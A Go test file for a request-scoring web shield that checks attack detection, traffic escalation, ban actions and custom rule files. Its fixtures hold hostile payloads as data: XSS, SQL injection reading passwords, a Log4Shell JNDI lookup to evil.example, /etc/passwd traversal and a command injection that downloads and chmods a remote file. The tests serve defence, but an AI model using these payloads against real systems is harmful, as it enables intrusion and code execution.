package shield

import (
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func scoring(t *testing.T, o ScoringOverrides) *Scoring {
	t.Helper()
	sc, err := LoadScoring([]string{repoCatalog}, "", o)
	if err != nil || sc == nil {
		t.Fatalf("scoring: %v", err)
	}
	return sc
}

func req(method, uri, ua string) Request {
	return Request{Method: method, URI: uri, UA: ua, Host: "blogcode.vn", Headers: map[string]string{}}
}

const browser = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"

func TestScoreDetectsAttacks(t *testing.T) {
	sc := scoring(t, ScoringOverrides{})
	cases := []struct {
		name, uri, ua, signal string
		minLevel              string
	}{
		{"xss script tag", "/search?q=<script>alert(1)</script>", browser, "xss-script-tag", "high"},
		{"xss url-encoded", "/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", browser, "xss-script-tag", "high"},
		{"xss double-encoded", "/search?q=%253Csvg%2520onload%253Dalert(1)%253E", browser, "xss-event-handler", "high"},
		{"xss html entities", "/p?x=&lt;img src=x onerror=alert(1)&gt;", browser, "xss-event-handler", "high"},
		{"xss javascript scheme", "/r?next=JaVaScRiPt:alert(1)", browser, "xss-js-scheme", "medium"},
		{"sqli union", "/item?id=1%20UNION%20ALL%20SELECT%20password,2%20FROM%20users--", browser, "sqli-union", "high"},
		{"sqli boolean", "/login?user=admin'%20or%20'1'='1", browser, "sqli-boolean", "medium"},
		{"sqli time", "/item?id=1;SELECT%20pg_sleep(10)", browser, "sqli-functions", "medium"},
		{"log4shell", "/?x=${jndi:ldap://evil.example/a}", browser, "log4shell", "critical"},
		{"dotenv", "/.env", "curl/8.0", "path-dotenv", "high"},
		{"traversal", "/static/..%2f..%2f..%2fetc/passwd", browser, "path-system-file", "critical"},
		{"command injection", "/ping?host=1.1.1.1;wget%20http://198.51.100.1/x%20-O%20/tmp/x;chmod%20+x%20/tmp/x", browser, "cmd-injection", "high"},
		{"scanner ua", "/", "Mozilla/5.0 (compatible; Nuclei - Open-source project)", "ua-scanner", "critical"},
		{"webdav", "/", browser, "", ""},
	}
	for _, c := range cases {
		if c.signal == "" {
			continue
		}
		score, hits := sc.ScoreRequest(req("GET", c.uri, c.ua), 0)
		if !strings.Contains(strings.Join(hits, " "), c.signal+"+") {
			t.Errorf("%s: %s not matched (hits %v)", c.name, c.signal, hits)
		}
		if rank(sc.Level(score)) < rank(c.minLevel) {
			t.Errorf("%s: score %d level %s, want ≥ %s (%v)", c.name, score, sc.Level(score), c.minLevel, hits)
		}
	}
	if s, _ := sc.ScoreRequest(req("PROPFIND", "/", browser), 0); s < 70 {
		t.Errorf("webdav method: %d", s)
	}
}

func rank(l string) int {
	return map[string]int{"normal": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}[l]
}

// The original nginx.score.json scored normal traffic; makit's version must not.
func TestScoreIgnoresNormalTraffic(t *testing.T) {
	sc := scoring(t, ScoringOverrides{})
	normal := []Request{
		req("GET", "/blog/curl-tutorial-wget-vs-curl?utm_source=google", browser),
		req("GET", "/search?q=base64+encode+in+javascript", browser),
		req("GET", "/search?q=how+to+use+chmod+and+nohup", browser),
		req("POST", "/api/comments", browser),
		req("DELETE", "/api/comments/42", browser),
		req("GET", "/posts/sql-union-select-explained", browser),
		req("GET", "/assets/app.4f9c2b.js", browser),
		req("GET", "/favicon.ico", browser),
		{Method: "GET", URI: "/healthz", UA: "kube-probe/1.30", Host: "blogcode.vn", Headers: map[string]string{}},
	}
	for _, r := range normal {
		if s, hits := sc.ScoreRequest(r, 200); sc.Level(s) != "normal" {
			t.Errorf("%s %s scored %d %v", r.Method, r.URI, s, hits)
		}
	}
	// WordPress paths: suspicious on a non-WordPress server, normal once the profile is on.
	wp := req("GET", "/wp-login.php", browser)
	if s, _ := sc.ScoreRequest(wp, 0); s < 50 {
		t.Errorf("wp-login on a non-WordPress server: %d", s)
	}
	wpOn := scoring(t, ScoringOverrides{Profiles: map[string]bool{"wordpress": true, "php": true}})
	if s, hits := wpOn.ScoreRequest(wp, 0); s != 0 {
		t.Errorf("wp-login with the wordpress profile: %d %v", s, hits)
	}
	off := scoring(t, ScoringOverrides{Disable: []string{"xss-script-tag"}})
	if _, hits := off.ScoreRequest(req("GET", "/?q=<script>", browser), 0); strings.Contains(strings.Join(hits, " "), "xss-script-tag") {
		t.Error("disabled signal still scored")
	}
}

func TestTrackerEscalationAndBursts(t *testing.T) {
	sc := scoring(t, ScoringOverrides{})
	tr := NewTracker(sc, 100)
	ip := netip.MustParseAddr("203.0.113.5")
	now := time.Now()
	var score int
	for i := 0; i < 10; i++ { // ten low-ish probes (score 30–49) escalate the IP
		score, _ = tr.Observe(ip, 35, []string{"path-php+30"}, 0, now.Add(time.Duration(i)*time.Second))
	}
	if score < 35+2*sc.Escalation.Add {
		t.Errorf("escalation: %d", score)
	}
	ip2 := netip.MustParseAddr("203.0.113.6")
	var fired []string
	for i := 0; i < 35; i++ { // path guessing: many 404s
		_, fired = tr.Observe(ip2, 5, nil, 404, now.Add(time.Duration(i)*time.Second))
	}
	if !strings.Contains(strings.Join(fired, " "), "burst-4xx") {
		t.Errorf("404 burst not detected: %v", fired)
	}
	// Window expiry resets the IP.
	if s, _ := tr.Observe(ip, 0, nil, 0, now.Add(time.Hour)); s != 0 {
		t.Errorf("window reset: %d", s)
	}
	if top := tr.Top(1); len(top) != 1 || top[0].IP != "203.0.113.6" {
		t.Errorf("top: %+v", top)
	}
}

func TestScoringActionsAndCustomFile(t *testing.T) {
	sc := scoring(t, ScoringOverrides{Actions: map[string]string{"medium": "block", "critical": "ban 7d"}})
	if a, _ := sc.Action("medium"); a != "block" {
		t.Errorf("medium: %s", a)
	}
	if a, d := sc.Action("critical"); a != "ban" || d != 7*24*time.Hour {
		t.Errorf("critical: %s %s", a, d)
	}
	if a, d := sc.Action("high"); a != "ban" || d != time.Hour {
		t.Errorf("high: %s %s", a, d)
	}
	f := filepath.Join(t.TempDir(), "mine.yaml")
	os.WriteFile(f, []byte("id: MINE\nlevels: {low: 10, critical: 20}\nactions: {critical: block}\nsignals:\n  - {id: secret, field: path, match: '^/secret', score: 25}\n"), 0o644)
	mine, err := LoadScoring([]string{repoCatalog}, f, ScoringOverrides{})
	if err != nil || mine.ID != "MINE" || len(mine.Signals) != 1 {
		t.Fatalf("custom file: %+v %v", mine, err)
	}
	if s, _ := mine.ScoreRequest(req("GET", "/secret/x", browser), 0); mine.Level(s) != "critical" {
		t.Errorf("custom scoring: %d", s)
	}
	if _, err := LoadScoring(nil, "/nonexistent.yaml", ScoringOverrides{}); err == nil {
		t.Error("missing custom file accepted")
	}
}

func TestDecideWithScoring(t *testing.T) {
	p := policy(t)
	p.Rules = nil // score only
	p.Scoring = scoring(t, ScoringOverrides{})
	p.Tracker = NewTracker(p.Scoring, 100)
	var bans []string
	p.Ban = func(a netip.Addr, d time.Duration, src, why string) {
		bans = append(bans, a.String()+" "+src+" "+d.String())
	}
	d := p.Decide(Request{Peer: "203.0.113.80", Method: "GET", URI: "/?q=<script>alert(1)</script>", UA: browser, Headers: map[string]string{}})
	if d.Allow || d.Level == "" || !strings.HasPrefix(d.Rule, "score:") {
		t.Errorf("xss decision: %+v", d)
	}
	if len(bans) != 1 || !strings.Contains(bans[0], "203.0.113.80 score:") {
		t.Errorf("bans: %v", bans)
	}
	ok := p.Decide(Request{Peer: "203.0.113.81", Method: "GET", URI: "/blog/curl-tutorial", UA: browser, Headers: map[string]string{}})
	if !ok.Allow || ok.Level != "normal" {
		t.Errorf("normal decision: %+v", ok)
	}
}
